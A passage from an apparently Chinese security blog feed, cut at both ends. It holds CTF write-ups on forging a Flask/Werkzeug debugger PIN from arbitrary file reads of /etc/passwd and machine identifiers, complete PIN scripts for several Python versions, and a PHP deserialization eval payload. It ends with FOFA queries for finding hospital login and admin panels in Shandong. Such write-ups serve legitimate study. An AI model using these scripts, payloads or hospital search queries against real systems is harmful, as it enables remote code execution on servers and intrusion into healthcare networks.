src="/images/polarctf/image-20240116141458091.png" alt="image-20240116141458091"></p><p>pin码生成条件？<br>pin码有六个要素：<br>1，flask的用户名：username可以任意文件读的条件下读/etc/passwd或者进行猜测<br>2，modname-一般是f1ask.app<br>3，getattr(app,”_name_”,app.<em>class__·_name</em>)一般是Flask<br>4，moddir flask)库下app.py的绝对路径可以通过报错获取<br>5，int(uuid,16)即当前网络的mac地址的十进制数<br>6，get_machine._id()机器的id</p><p>回到题目</p><p>根据题目报错得知，有一个file路由，然后传参filename<br>这里猜测出现了任意文件读取，<br><a href="http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=app.py">http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=app.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">return</span> Hello[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/file&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;不试试filename参数么?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>1，直接读取源码，可以看到就一个任意文件读取，因为题目给了pin，那么我们这里直接读取我们想要的，<br><a href="http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/etc/passwd">http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/etc/passwd</a></p><p><img src="/images/polarctf/image-20240116142708405.png" alt="image-20240116142708405"></p><p>没有啊，没有就用root<br>2，app.py的绝对路径，在报错页面可以看到，/usr/local/lib/python3.5/site-packages/flask/app.py<br><img src="/images/polarctf/image-20240116142915826.png" alt="image-20240116142915826"></p><p>3，mac地址的十进制数</p><p><code>http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/sys/class/net/eth0/address</code><br>02:42:ac:02:c4:8a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 02:42:ac:02:c4:8a</span><br><span class="line"># 将：去掉</span><br><span class="line"># 0242ac02c48a</span><br><span class="line"># 在python中进行转化</span><br><span class="line">print(int(&#x27;0242ac02c48a&#x27;,16))</span><br><span class="line"># 得到</span><br><span class="line"># 2485376959626</span><br></pre></td></tr></table></figure><p>4，引用大佬的解释：<br>对于非docker机每一个机器都会有自已唯-一的id<br>linux的id一般存放在/etc/machine-id或proc/sys/kernel/random/boot_i,有的<br>系统没有这两个文件。<br>对于docker机则读取/proc/self/cgroup,其中/docker/字符串后面的内容作为机器的id,</p><p><code>view-source:http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/proc/self/cgroup</code></p><p><img src="/images/polarctf/image-20240116143523439.png" alt="image-20240116143523439"></p><p>0::/docker/ce60aaa5cf72377fd3ba0eaba35544d4e680767b372b76b4a002241e8ff0302c<br>这里题目为3.5版本的python，还需要获取*/etc/machine-id<em>，且</em>/etc/machine-id*在前<br><img src="/images/polarctf/image-20240116150947159.png" alt="image-20240116150947159"></p><p>点击网站右边的小黑shell，输入213-649-252即可进入</p><p>进入之后再点小黑shell，即可命令执行了，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os.popen(<span class="string">&quot;ls -1 /&quot;</span>).read() </span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nflag.sh\nflaggggg\nhome\nlib\nlib64\nmedia\[ ](http://6678d206-8d6f-4e53-a10e-99bbf94cc920.www.polarctf.com:8090/#)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">os.popen(&quot;cat /flaggggg&quot;).read() </span></span><br><span class="line"><span class="string">&#x27;</span>flag&#123;873894c49201cd995ee2c52e6270630d&#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20240116151400389.png" alt="image-20240116151400389"></p><h6 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h6><p>这里一定要注意不同的python版本的计算pin值是不同的，<br><code>python3.5的get_machine_id()值为/etc/machine-id+/proc/self/cgroup</code><br>下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="comment">#/sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;32e48d371198e8420c53b0a1fa37e94d&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id+/proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>python3.6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3.7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>python3.8的machine_id由三个合成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice"></a>php very nice</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$sys</span>=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;sys);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Example();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$s</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> http:<span class="comment">//3b626d75-482d-4c21-a603-ee2c36749c68.www.polarctf.com:8090/?a=O:7:&quot;Example&quot;:1:&#123;s:3:&quot;sys&quot;;s:23:&quot;system(&#x27;cat flag.php&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mimikatz用法</title>
      <link href="/2023/12/01/mimikatz%E7%94%A8%E6%B3%95/mimikatz%E7%94%A8%E6%B3%95/"/>
      <url>/2023/12/01/mimikatz%E7%94%A8%E6%B3%95/mimikatz%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>shizhanzhongdeyixietips</title>
      <link href="/2023/11/29/shizhanzhongdeyixietips/"/>
      <url>/2023/11/29/shizhanzhongdeyixietips/</url>
      
        <content type="html"><![CDATA[<h5 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">country=&quot;CN&quot;&amp;&amp;(title=&quot;医疗&quot;||title=&quot;医院&quot;)&amp;&amp;city=&quot;山东&quot;</span><br><span class="line"></span><br><span class="line">title=&quot;目标名称&quot; &amp;&amp; </span><br><span class="line">region=&quot;shandong&quot; </span><br><span class="line">city=&quot;jinan&quot;</span><br><span class="line">(title=&quot;医院&quot; || title=&quot;医疗&quot; || title=&quot;卫生健康&quot;|| title=&quot;卫健委&quot; || body=&quot;医疗&quot;)&amp;&amp; region=&quot;山东省&quot; </span><br><span class="line">cert=&quot;目标域名或者证书关键字&quot; &amp;&amp; region=&quot;xx省&quot; </span><br><span class="line">cert=&quot;医疗&quot; &amp;&amp; city=&quot;济南市&quot; </span><br><span class="line">((title=&quot;目标名称&quot; || host=&quot;目标域名&quot;) &amp;&amp; country=&quot;CN&quot;) &amp;&amp; region!=&quot;HK&quot;</span><br><span class="line">app=&quot;ThinkPHP&quot; &amp;&amp; (status_code=&quot;200&quot; || banner=&quot;HTTP/1.1 200 OK&quot;) &amp;&amp; country=&quot;CN&quot;</span><br><span class="line">(title=&quot;医院&quot; || title=&quot;医疗&quot; || title=&quot;卫生健康&quot; || title=&quot;卫健委&quot; || title=&quot;医院后台&quot; ) &amp;&amp; region=&quot;Shandong&quot;</span><br><span class="line">`https://buaq.net/go-145641.html`</span><br><span class="line"></span><br><span class="line">title=&quot;登陆&quot; &amp;&amp; &quot;济南市&quot; &amp;&amp; &quot;医院&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;  鸡肋</span><br><span class="line">title=&quot;管理&quot; &amp;&amp; &quot;XX市&quot; &amp;&amp; &quot;XX医院&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;</span><br><span class="line">title=&quot;系统&quot; &amp;&amp; &quot;XX市&quot; &amp;&amp; &quot;XX医院&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;</span><br><span class="line">title=&quot;测试&quot; &amp;&amp; &quot;XX市&quot; &amp;&amp; &quot;XX医院&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;等等···</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(title=&quot;威海市立医院&quot; || title=&quot;卫健委&quot; || title=&quot;卫生健康&quot; || title=&quot;医院后台&quot; || title=&quot;医院登录后台&quot;||title=&quot;医院后台登录&quot;) &amp;&amp; region=&quot;Shandong&quot;</span><br><span class="line">不是很准</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="fofa工具"><a href="#fofa工具" class="headerlink" title="fofa工具"></a>fofa工具</h5><h6 id="FofaMap"><a href="#FofaMap" class="headerlink" title="FofaMap"></a>FofaMap</h6><p><a href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p><p>可以联动nuclei进行漏洞扫描，但是感觉还是很鸡肋  慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 